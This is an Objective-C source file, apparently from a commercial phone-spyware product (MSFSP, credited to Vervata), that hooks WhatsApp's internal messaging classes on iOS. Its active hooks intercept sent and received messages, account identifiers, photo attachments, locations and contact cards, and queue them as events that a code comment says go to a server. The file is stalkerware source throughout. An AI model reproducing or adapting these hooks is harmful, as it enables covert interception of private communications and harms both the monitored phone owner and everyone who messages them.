/**
 - Project name :  MSFSP
 - Class name   :  WhatsApp
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  27/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */


#import "MSFSP.h"
#import "XMPPStream.h"
#import "XMPPConnection.h"
#import "XMPPMessageStanza.h"
#import "WhatsAppUtils.h"
#import "WhatsAppAccountInfo.h"
#import "WhatsAppMediaObject.h"				// for capture WhatsApp photo attachment
#import "WhatsAppMediaUtils.h"				// for capture WhatsApp photo attachment
#import "WAChatStorage.h"					// for capture WhatsApp photo attachment
#import "WAMessage.h"						// for capture WhatsApp photo attachment

//#import "WAMediaViewController.h"
//#import "MessageComposeController.h"
//#import "WAMediaObject.h"

#import <UIKit/UIKit.h>
#import <CoreGraphics/CoreGraphics.h>

#pragma mark -
#pragma mark OutGoing
#pragma mark version: EARIER than 2.8.2

/*****************************************************************************************
 * Description	- Send WhatsApp message (for WhatsApp version: eailier than 2.8.2)
 * Class		- XMPPStream
 * Method		- send:
 * Argument		- (XMPPStanzaMessage *) arg1
 * Return		- void
 ****************************************************************************************/
HOOK(XMPPStream, send$, void, id arg) { 
	DLog(@"CAPTURE: Capturing XMPPStream =====> send");
	CALL_ORIG(XMPPStream, send$, arg);
	
	WhatsAppAccountInfo *waAccInfo = [WhatsAppAccountInfo shareWhatsAppAccountInfo];
	if ([arg isMemberOfClass:objc_getClass("XMPPMessageStanza")]) {
		DLog(@"Capturing XMPPStream =====> sending....");
		WhatsAppUtils *wUtils = [[[WhatsAppUtils alloc]init]autorelease];
		
		DLog(@"Capturing XMPPStream =====> user name = %@, [self xmppUser] = %@", 
			 [waAccInfo mUserName],			// e.g, 4s 
			 [self xmppUser]);				// e.g, 66867851331
		
		NSDictionary *accountInfo = [wUtils accountInfo:[self xmppUser]			
											   userName:[waAccInfo mUserName]];			// create a dictionary with two pair (user id and username)
		[wUtils setMAccountInfo:accountInfo];
		[wUtils createOutgoingWhatsAppEvent:arg];
	}
	else if ([arg isMemberOfClass:objc_getClass("XMPPPresenceStanza")]) {
		if([[arg attributes] objectForKey:@"name"]) {
			[waAccInfo setMUserName:(NSString *)[[arg attributes] objectForKey:@"name"]];
			DLog(@"Capturing XMPPMessageStanza =====> User Name:%@", [waAccInfo mUserName]);
		}
	}
	else {
		DLog(@"Capturing XMPPMessageStanza =====> Argument:%@",arg);
	}
}


#pragma mark version 2.8.2, 2.8.3, 2.8.4, 2.8.6 and 2.8.7

/*****************************************************************************************
 * Description		- Send WhatsApp message (for WhatsApp version 2.8.2, 2.8.3)
 * Class			- XMPPStream
 * Method			- send:encrypted:
 * Argument			- (XMPPStanzaMessage *) arg1
 * Return			- void
 ****************************************************************************************/
HOOK(XMPPStream, send$encrypted$, void, id arg1, BOOL arg2) { 
	DLog(@"---------------------------------------------------------")
	DLog(@"CAPTURE: Capturing XMPPStream =====> send:encrypted");
	CALL_ORIG(XMPPStream, send$encrypted$, arg1, arg2);
	DLog (@"arg1 %@",arg1)
	DLog (@"arg1 %@",[arg1 class])
	
	WhatsAppAccountInfo *waAccInfo = [WhatsAppAccountInfo shareWhatsAppAccountInfo];
	
	if ([arg1 isMemberOfClass:objc_getClass("XMPPMessageStanza")]) {
		DLog(@"Capturing XMPPStream =====>sending....");		
		DLog(@"media %@",				[arg1 media])
		DLog(@"locationName %@",		[arg1 locationName])
		DLog(@"locationLongitude %@",	[arg1 locationLongitude])
		DLog(@"locationLatitude %@",	[arg1 locationLatitude])
		DLog(@"vCardContactName %@",	[arg1 vCardContactName])
		DLog(@"vCardStringValue %@",	[arg1 vCardStringValue])
		DLog(@"thumbnailData %@",		[arg1 thumbnailData])
		DLog(@"mediaDuration %d",		[arg1 mediaDuration])
		DLog(@"mediaName %@",			[arg1 mediaName])
		DLog(@"mediaURL %@",			[arg1 mediaURL])
		DLog(@"hasMedia %d",			[arg1 hasMedia])
		DLog(@"hasBody %d",				[arg1 hasBody])
		DLog(@"mediaType %d",			[arg1 mediaType])					
		DLog(@"media [%@] %@",			[[arg1 media] class], [arg1 media])	// XMPPStanzaElement
		DLog(@"media value %@",			[[arg1 media] value])	
		//[(NSData *)[[arg1 media] value] writeToFile:@"/tmp/out.jpg" atomically:YES];		
		DLog(@"name %@",				[[arg1 media] name])	
		DLog(@"attributes %@",			[[arg1 media] attributes])			
		DLog(@"body %@",				[arg1 body])	
		DLog(@"vcard %@",				[arg1 vcard])
		
		WhatsAppUtils *wUtils = [[[WhatsAppUtils alloc] init] autorelease];

		DLog(@"Capturing XMPPStream =====> user name = %@, [self xmppUser] = %@", 
			 [waAccInfo mUserName],			// e.g, 4s 
			 [self xmppUser]);				// e.g, 66867851331
		
		NSDictionary *accountInfo = [wUtils accountInfo:[self xmppUser]			
											   userName:[waAccInfo mUserName]];			// create a dictionary with two pair (user id and username)
		[wUtils setMAccountInfo:accountInfo];
		[wUtils createOutgoingWhatsAppEvent:arg1];
	}
	else if ([arg1 isMemberOfClass:objc_getClass("XMPPPresenceStanza")]) {
		if([[arg1 attributes] objectForKey:@"name"]) {				// name of the account in WhatsApp application
			[waAccInfo setMUserName:(NSString *)[[arg1 attributes] objectForKey:@"name"]];
			DLog(@"Capturing XMPPMessageStanza =====>User Name:%@", [waAccInfo mUserName]);
		}
	} else {
		DLog(@"Capturing XMPPMessageStanza =====> Argument:%@",arg1);
	}
	
	DLog (@"============ END send and encrypt =============")
}


/*****************************************************************************************
 * Description		- Send image (for WhatsApp version 2.8.7, for OUTGOING image only)
 * Class			- WAChatStorage
 * Method			- messageWithImage:inChatSession:saveToLibrary:error:
 * Argument			- id image (UIImage *), id chatSession,  BOOL library, id* error
 * Return			- id (WAMessage *)
 ****************************************************************************************/
HOOK(WAChatStorage, messageWithImage$inChatSession$saveToLibrary$error$, id, id image, id chatSession, BOOL library, id* error) { 
	DLog (@"=================================================")
	DLog (@"================  messageWithImage =====================")
	DLog (@"=================================================")	
		
	WAMessage *waMessage				= CALL_ORIG(WAChatStorage,messageWithImage$inChatSession$saveToLibrary$error$, image, chatSession, library, error);				
	
	WhatsAppMediaObject *mediaObject	= [[WhatsAppMediaObject alloc] init];
	[mediaObject setMImage:image];							//	UIImage
	[mediaObject setMMessageID:[waMessage stanzaID]];
	[[WhatsAppMediaUtils shareWhatsAppMediaUtils] addMediaObject:mediaObject];
	
	//NSData *thumbnailData				= [self thumbnailDataForMessage:waMessage];	
	//[mediaObject setMThumbnailData:thumbnailData];
		
	[mediaObject release];
	mediaObject = nil;
		
	DLog (@"message id of image: %@", [waMessage stanzaID])	
	DLog (@"============ CALL ORGI, before return")	
	return waMessage;
}

#pragma mark -
#pragma mark Incoming
#pragma mark version: earlier than 2.8.2, 2.8.3

/*****************************************************************************************
 * Description	- Recieve WhatsApp message (for WhatsApp version: eailier than 2.8.2, 2.8.2, 2.8.3)
 * Class			- XMPPConnection
 * Method		- processIncomingMessages:
 * Argument		- (XMPPStanzaArray *) arg1
 * Return		- void
 *******************************************************************************************/
HOOK(XMPPConnection, processIncomingMessages$, void, id arg) { 
	DLog(@"CAPTURE: Capturing XMPPConnection =====> processIncomingMessages")
	DLog (@"arg %@",arg)
	DLog (@"arg class %@",[arg class])
	
	CALL_ORIG(XMPPConnection, processIncomingMessages$, arg);
	
	WhatsAppUtils *wUtils = [[[WhatsAppUtils alloc] init] autorelease];
	
	NSDictionary *accountInfo = [wUtils accountInfo:[self xmppUser]
										   userName:[[WhatsAppAccountInfo shareWhatsAppAccountInfo] mUserName]];
	[wUtils setMAccountInfo:accountInfo];	
	
	//	id incomingParts = [wUtils incomingMessageParts:arg];
	
	// -- send event to the server
	for (XMPPMessageStanza *eachMessage in arg) {
		[wUtils performSelector:@selector(createIncomingWhatsAppEvent:) 
					 withObject:eachMessage
					 afterDelay:5.0];
		
	}
}


/*****************************************************************************************
 * Description		- Send Video (for WhatsApp version 2.8.7)
 * Class			- WAChatStorage
 * Method			- messageWithMovieURL:inChatSession:copyFile:error:
 * Argument			- id url, id chatSession,  BOOL copyFile, id* error
 * Return			- id (WAMessage *)
 ****************************************************************************************/
//HOOK(WAChatStorage, messageWithMovieURL$inChatSession$copyFile$error$, id, id url, id chatSession, BOOL arg3, id* error) { 
//	DLog (@"=================================================")
//	DLog (@"================  messageWithMovieURL =====================")
//	DLog (@"=================================================")	
//	
//	WAMessage *waMessage				= CALL_ORIG(WAChatStorage, messageWithMovieURL$inChatSession$copyFile$error$, url, chatSession, arg3, error);		
//		
//	WhatsAppMediaObject *mediaObject	= [[WhatsAppMediaObject alloc] init];
//	[mediaObject setMMessageID:[waMessage stanzaID]];
//	[mediaObject setMVideoUrl:(NSURL*) url];
//	[[WhatsAppMediaUtils shareWhatsAppMediaUtils] addMediaObject:mediaObject];
//	[mediaObject release];
//	mediaObject = nil;
//	
//	DLog (@"url: [%@] %@", [url class], url)	
//	DLog (@"chatSession: %@", chatSession)	
//	DLog (@"copyFile: %d", arg3)		
//	DLog (@"message id of image: %@", [waMessage stanzaID])		
//	
//	return waMessage;
//}



//HOOK(WAChatStorage,messageWithMediaAtPath$ofType$mediaURL$fileSize$thumbnailPath$thumbnailData$inChatSessionsend$, id, id path, int type, id url, unsigned fileSize, id thumbnailPath, id thumbnailData, id chatSession, BOOL send) { 
//	DLog (@"=================================================")
//	DLog (@"================  messageWithMediaAtPath =====================")
//	DLog (@"=================================================")	
//	
//	
//	WAMessage *waMessage = CALL_ORIG(WAChatStorage,messageWithMediaAtPath$ofType$mediaURL$fileSize$thumbnailPath$thumbnailData$inChatSessionsend$, path, type, url, fileSize, thumbnailPath, thumbnailData, chatSession, send);		
//	DLog (@"path [%@] %@", [path class], path)	
//	DLog (@"type [%d] ", type)
//	DLog (@"url [%@] %@", [url class], url)
//	DLog (@"fileSize [%d]", fileSize)
//	DLog (@"thumbnailPath [%@] %@", [thumbnailPath class], thumbnailPath)
//	DLog (@"thumbnailData [%@] %@", [thumbnailData class], thumbnailData)
//	DLog (@"chatSession [%@] %@", [chatSession class], chatSession)
//	DLog (@"send [%d]", send)
//
//
//	return waMessage;
//}


//HOOK(WAChatStorage, saveImageToTempDirectory$error$, id, id tempDirectory, id* error) { 
//	DLog (@"=================================================")
//	DLog (@"================  saveImageToTempDirectory =====================")
//	DLog (@"=================================================")	
//	
//	
//	WAMessage *waMessage = CALL_ORIG(WAChatStorage,saveImageToTempDirectory$error$, tempDirectory, error);		
//	DLog (@"waMessage [%@] %@", [waMessage class], waMessage)	
//
//	DLog (@"tempDirectory [%@] %@", [tempDirectory class], tempDirectory)	
//	return waMessage;
//}

//HOOK(WAMediaObject, initWithMessage$path$, id, id message, id path) { 
//	DLog (@"=================================================")
//	DLog (@"================ initWithMessage path ====================")
//	DLog (@"=================================================")
//	id mediaObject =  CALL_ORIG(WAMediaObject, initWithMessage$path$, message, path);
//	
//	DLog (@"message [%@] %@", [message class], message)	
//	DLog (@"path [%@] %@", [path class], path)	
//	DLog (@"mediaObject [%@] %@", [mediaObject class], mediaObject)	
//	return mediaObject;
//}

//HOOK(WAMediaViewController, imageCropControllerDidCancel$, void, id imageCropController) { 
//	DLog (@"=================================================")
//	DLog (@"================ imageCropControllerDidCancel ====================")
//	DLog (@"=================================================")
//	CALL_ORIG(WAMediaViewController, imageCropControllerDidCancel$, imageCropController);
//	DLog (@"imageCropController [%@] %@", [imageCropController class], imageCropController)	
//}
//
//HOOK(WAMediaViewController, imageCropController$didFinishWithImage$, void, id controller, id image) { 
//	DLog (@"=================================================")
//	DLog (@"================ imageCropController didFinishWithImage====================")
//	DLog (@"=================================================")
//	CALL_ORIG(WAMediaViewController, imageCropController$didFinishWithImage$, controller, image);
//	DLog (@"controller [%@] %@", [controller class], controller)	
//	DLog (@"image [%@] %@", [image class], image)	
//}
//
//HOOK(WAMediaViewController, video$didFinishSavingWithError$contextInfo$, void, id video, id error, void* info) { 
//	DLog (@"=================================================")
//	DLog (@"================ video didFinishSavingWithError contextInfo=====================")
//	DLog (@"=================================================")
//	CALL_ORIG(WAMediaViewController,video$didFinishSavingWithError$contextInfo$, video, error, info);
//	DLog (@"video [%@] %@", [video class], video)	
//	DLog (@"error [%@] %@", [error class], error)	
//	DLog (@"info %@", info)	
//}
//
//HOOK(WAMediaViewController, image$didFinishSavingWithError$contextInfo$, void, id image, id error, void* info) { 
//	DLog (@"=================================================")
//	DLog (@"================ image didFinishSavingWithError contextInfo=====================")
//	DLog (@"=================================================")
//	CALL_ORIG(WAMediaViewController,image$didFinishSavingWithError$contextInfo$, image, error, info);
//	DLog (@"image [%@] %@", [image class], image)	
//	DLog (@"error [%@] %@", [error class], error)	
//	DLog (@"info %@", info)	
//}
//HOOK(MessageComposeController, attachImage$, void, id image) { 
//	DLog (@"=================================================")
//	DLog (@"================ attachImage ====================")
//	DLog (@"=================================================")
//	CALL_ORIG(MessageComposeController, attachImage$, image);
//	DLog (@"image [%@] %@", [image class], image)	
//}
//
//HOOK(MessageComposeController, attachVideo$compress$copyToTempDir$, void, id video, BOOL compress, BOOL tempDir) { 
//	DLog (@"=================================================")
//	DLog (@"================  attachVideo =====================")
//	DLog (@"=================================================")
//	CALL_ORIG(MessageComposeController,attachVideo$compress$copyToTempDir$, video, compress, tempDir);
//	DLog (@"video [%@] %@", [video class], video)	
//	DLog (@"compress %d", compress)	
//	DLog (@"tempDir %d", tempDir)	
//}

